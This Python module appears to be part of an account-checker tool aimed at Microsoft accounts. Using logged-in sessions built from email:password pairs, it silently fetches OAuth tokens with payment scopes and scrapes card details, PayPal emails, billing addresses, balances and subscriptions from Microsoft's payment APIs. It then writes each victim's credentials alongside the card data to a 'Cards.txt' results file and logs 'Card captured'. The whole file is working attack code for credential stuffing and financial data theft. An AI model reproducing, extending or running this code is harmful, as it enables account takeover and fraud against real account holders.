import re
import json
import time
import requests
from urllib.parse import urlparse, parse_qs


def _get_auth_token(session, client_id, scope, redirect_uri, config, token_cache=None):
    cache_key = f'{client_id}:{scope}:{redirect_uri}'
    if token_cache is not None and cache_key in token_cache:
        token_data = token_cache[cache_key]
        if time.time() - token_data['timestamp'] < 300:
            return token_data['token']
    try:
        auth_url = (
            f'https://login.live.com/oauth20_authorize.srf'
            f'?client_id={client_id}&response_type=token&scope={scope}'
            f'&redirect_uri={redirect_uri}&prompt=none'
        )
        r = session.get(auth_url, timeout=int(config.get('timeout', 10)))
        token = parse_qs(urlparse(r.url).fragment).get('access_token', [None])[0]
        if token and token_cache is not None:
            token_cache[cache_key] = {'token': token, 'timestamp': time.time()}
        return token
    except Exception:
        return None


def _lr_parse(source, start_delim, end_delim, create_empty=True):
    pattern = re.escape(start_delim) + '(.*?)' + re.escape(end_delim)
    match = re.search(pattern, source)
    if match:
        return match.group(1)
    return '' if create_empty else None


def check_payment_instruments(session, config, token_cache=None):
    try:
        token = _get_auth_token(
            session,
            '000000000004773A',
            'PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete',
            'https://account.microsoft.com/auth/complete-silent-delegate-auth',
            config,
            token_cache
        )
        if not token:
            return []
        headers = {
            'Authorization': f'MSADELEGATE1.0={token}',
            'Accept': 'application/json'
        }
        r = session.get(
            'https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-GB',
            headers=headers,
            timeout=15
        )
        instruments = []
        if r.status_code == 200:
            try:
                data = r.json()
                for item in data:
                    if 'paymentMethod' in item:
                        pm = item['paymentMethod']
                        family = pm.get('paymentMethodFamily')
                        type_ = pm.get('paymentMethodType')
                        if family == 'credit_card':
                            last4 = pm.get('lastFourDigits', 'N/A')
                            expiry = f"{pm.get('expiryMonth', '')}/{pm.get('expiryYear', '')}"
                            instruments.append(f'CC: {type_} *{last4} ({expiry})')
                        elif family == 'paypal':
                            pp_email = pm.get('email', 'N/A')
                            instruments.append(f'PayPal: {pp_email}')
            except Exception:
                pass
        return instruments
    except Exception:
        return []


def check_billing_address(session):
    try:
        r = session.get('https://account.microsoft.com/billing/api/addresses', timeout=15)
        addresses = []
        if r.status_code == 200:
            try:
                data = r.json()
                for item in data:
                    line1 = item.get('line1', '')
                    city = item.get('city', '')
                    postal = item.get('postalCode', '')
                    country = item.get('country', '')
                    if line1:
                        addresses.append(f'{line1}, {city}, {postal}, {country}')
            except Exception:
                pass
        return addresses
    except Exception:
        return []


def check_payment_deep(session, email, password, config, fname, file_lock, UI_ENABLED=False, ui=None):
    try:
        headers = {
            'Host': 'login.live.com',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'close',
            'Referer': 'https://account.microsoft.com/'
        }
        r = session.get(
            'https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token'
            '&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete'
            '&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth'
            '&state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D&prompt=none',
            headers=headers,
            timeout=int(config.get('timeout', 10))
        )
        token = parse_qs(urlparse(r.url).fragment).get('access_token', ['None'])[0]

        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36',
            'Pragma': 'no-cache',
            'Accept': 'application/json',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Language': 'en-US,en;q=0.9',
            'Authorization': f'MSADELEGATE1.0={token}',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json',
            'Host': 'paymentinstruments.mp.microsoft.com',
            'ms-cV': 'FbMB+cD6byLL1mn4W/NuGH.2',
            'Origin': 'https://account.microsoft.com',
            'Referer': 'https://account.microsoft.com/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'Sec-GPC': '1'
        }
        r = session.get(
            'https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-GB',
            headers=headers,
            timeout=int(config.get('timeout', 10))
        )

        date_registered = _lr_parse(r.text, '"creationDateTime":"', 'T', create_empty=False)
        fullname        = _lr_parse(r.text, '"accountHolderName":"', '"', create_empty=False)
        address1        = _lr_parse(r.text, '"address":{"address_line1":"', '"')
        card_holder     = _lr_parse(r.text, 'accountHolderName":"', '","')
        credit_card     = _lr_parse(r.text, 'paymentMethodFamily":"credit_card","display":{"name":"', '"')
        expiry_month    = _lr_parse(r.text, 'expiryMonth":"', '",')
        expiry_year     = _lr_parse(r.text, 'expiryYear":"', '",')
        last4           = _lr_parse(r.text, 'lastFourDigits":"', '",')
        paypal_email    = _lr_parse(r.text, 'email":"', '"', create_empty=False)
        balance         = _lr_parse(r.text, 'balance":', ',"', create_empty=False)

        json_data = json.loads(r.text)
        city = region = zipcode = card_type = cod = ''
        items = json_data if isinstance(json_data, list) else [json_data]
        for item in items:
            if isinstance(item, dict):
                city      = item.get('city', city)
                region    = item.get('region', region)
                zipcode   = item.get('postal_code', zipcode)
                card_type = item.get('cardType', card_type)
                cod       = item.get('country', cod)

        user_address = f'[Address: {address1} City: {city} State: {region} Postalcode: {zipcode} Country: {cod}]'
        cc_info = f'[CardHolder: {card_holder} | CC: {credit_card} | CC expiryMonth: {expiry_month} | CC ExpYear: {expiry_year} | CC Last4Digit: {last4} | CC Funding: {card_type}]'

        r2 = session.get(
            'https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions',
            headers=headers
        )

        ctpid            = _lr_parse(r2.text, '"subscriptionId":"ctp:', '"')
        item1            = _lr_parse(r2.text, '"title":"', '"')
        auto_renew       = _lr_parse(r2.text, f'"subscriptionId":"ctp:{ctpid}","autoRenew":', ',')
        start_date       = _lr_parse(r2.text, '"startDate":"', 'T')
        next_renewal     = _lr_parse(r2.text, '"nextRenewalDate":"', 'T')

        sub1_parts = []
        if item1 is not None:        sub1_parts.append(f'Purchased Item: {item1}')
        if auto_renew is not None:   sub1_parts.append(f'Auto Renew: {auto_renew}')
        if start_date is not None:   sub1_parts.append(f'startDate: {start_date}')
        if next_renewal is not None: sub1_parts.append(f'Next Billing: {next_renewal}')
        subscription1 = f"[ {' | '.join(sub1_parts)} ]" if sub1_parts else None

        mdrid            = _lr_parse(r2.text, '"subscriptionId":"mdr:', '"')
        auto_renew2      = _lr_parse(r2.text, f'"subscriptionId":"mdr:{mdrid}","autoRenew":', ',')
        start_date2      = _lr_parse(r2.text, '"startDate":"', 'T')
        recurring        = _lr_parse(r2.text, 'recurringFrequency":"', '"')
        next_renewal2    = _lr_parse(r2.text, '"nextRenewalDate":"', 'T')
        item_bought      = _lr_parse(r2.text,
            f'"subscriptionId":"mdr:{mdrid}","autoRenew":{auto_renew2},"startDate":"{start_date2}",'
            f'"recurringFrequency":"{recurring}","nextRenewalDate":"{next_renewal2}","title":"', '"')

        sub2_parts = []
        if item_bought is not None:  sub2_parts.append(f"Purchased Item's: {item_bought}")
        if auto_renew2 is not None:  sub2_parts.append(f'Auto Renew: {auto_renew2}')
        if start_date2 is not None:  sub2_parts.append(f'startDate: {start_date2}')
        if recurring is not None:    sub2_parts.append(f'Recurring: {recurring}')
        if next_renewal2 is not None: sub2_parts.append(f'Next Billing: {next_renewal2}')
        subscription2 = f"[{' | '.join(sub2_parts)}]" if sub2_parts else None

        description   = _lr_parse(r2.text, '"description":"', '"')
        product_typee = _lr_parse(r2.text, '"productType":"', '"')
        product_type  = {'PASS': 'XBOX GAME PASS', 'GOLD': 'XBOX GOLD'}.get(product_typee, product_typee)
        quantity      = _lr_parse(r2.text, 'quantity":', ',')
        currency      = _lr_parse(r2.text, 'currency":"', '"')
        total_val     = _lr_parse(r2.text, 'totalAmount":', '', create_empty=False)
        total_amount  = (total_val + f' {currency}') if total_val is not None else f'0 {currency}'

        sub3_parts = []
        if description is not None:  sub3_parts.append(f'Product: {description}')
        if product_type is not None: sub3_parts.append(f'Product Type: {product_type}')
        if quantity is not None:     sub3_parts.append(f'Total Purchase: {quantity}')
        if total_amount is not None: sub3_parts.append(f'Total Price: {total_amount}')
        subscription3 = f"[ {' | '.join(sub3_parts)} ]" if sub3_parts else None

        has_payment = False
        output_lines = []

        if date_registered: output_lines.append(f'Date Registered: {date_registered}')
        if fullname:        output_lines.append(f'Fullname: {fullname}')
        if address1:        output_lines.append(f'User Address: {user_address}')
        if paypal_email:
            output_lines.append(f'Paypal Email: {paypal_email}')
            has_payment = True
        if credit_card and cc_info:
            output_lines.append(f'CC Info: {cc_info}')
            has_payment = True
        if balance:         output_lines.append(f'Balance: {balance}')
        if subscription1:   output_lines.append(subscription1)
        if subscription2:   output_lines.append(subscription2)
        if subscription3:   output_lines.append(subscription3)

        if has_payment or balance or subscription1 or subscription2 or subscription3:
            if credit_card and last4:
                card_line = (
                    f'{email}:{password} | Card: {credit_card} | Last4: {last4}'
                    f' | Exp: {expiry_month}/{expiry_year} | Type: {card_type} | Holder: {card_holder}'
                )
                with file_lock:
                    with open(f'results/{fname}/Cards.txt', 'a', encoding='utf-8') as f:
                        f.write(card_line + '\n')
                if UI_ENABLED and ui:
                    ui.log_info(f'Card captured: {credit_card} ending {last4}')
            if paypal_email:
                paypal_line = f"{email}:{password} | PayPal: {paypal_email} | Holder: {fullname or 'N/A'}"
                with file_lock:
                    with open(f'results/{fname}/Cards.txt', 'a', encoding='utf-8') as f:
                        f.write(paypal_line + '\n')
                if UI_ENABLED and ui:
                    ui.log_info(f'PayPal captured: {paypal_email}')
            return output_lines
        return []
    except Exception:
        return []


def fetch_payment_methods(session, email, password, config, fname, file_lock, write_dedupe,
                          token_cache=None, UI_ENABLED=False, ui=None):
    results = {}

    if config.get('check_payment_methods') or config.get('check_credit_cards') or config.get('check_paypal'):
        instruments = check_payment_instruments(session, config, token_cache)
        if instruments:
            results['instruments'] = instruments

    if config.get('check_billing_address'):
        addresses = check_billing_address(session)
        if addresses:
            write_dedupe(fname, 'Billing_Addresses.txt', f"{email}:{password} | Address: {'; '.join(addresses)}\n")
            results['billing_addresses'] = addresses

    if config.get('check_payment'):
        deep = check_payment_deep(session, email, password, config, fname, file_lock, UI_ENABLED, ui)
        if deep:
            results['deep'] = deep

    return results
